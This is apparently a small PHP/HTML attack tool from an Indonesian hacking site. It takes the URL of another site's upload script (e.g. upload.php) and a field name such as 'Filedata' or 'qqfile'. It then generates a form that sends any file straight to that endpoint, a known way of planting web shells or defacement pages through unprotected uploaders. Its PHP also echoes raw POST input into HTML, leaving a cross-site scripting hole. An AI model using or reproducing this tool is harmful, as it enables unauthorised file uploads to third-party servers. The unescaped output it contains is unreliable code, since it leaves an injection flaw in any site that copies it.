

    <section class="inner-page">
      <div class="container">
<form method="post">
  <div class="form-group">
<label for="url">URL Target</label><input class="form-control" type="text" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" required><br>
<label for="url">Post File : </label><input class="form-control" type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" required><br>
<input class="btn btn-primary is-loading" type="submit" name="d" value="Kunci Target!!!">
  </div>
</form>
<?php
$url = $_POST['url'];
$pf = $_POST['pf'];
$d = $_POST['d'];
if($d) {
    echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input class='btn btn-primary is-loading' type='submit' name='g' value='Upload!'></form>";
}
?>
</form>
  








  </div>
    </section>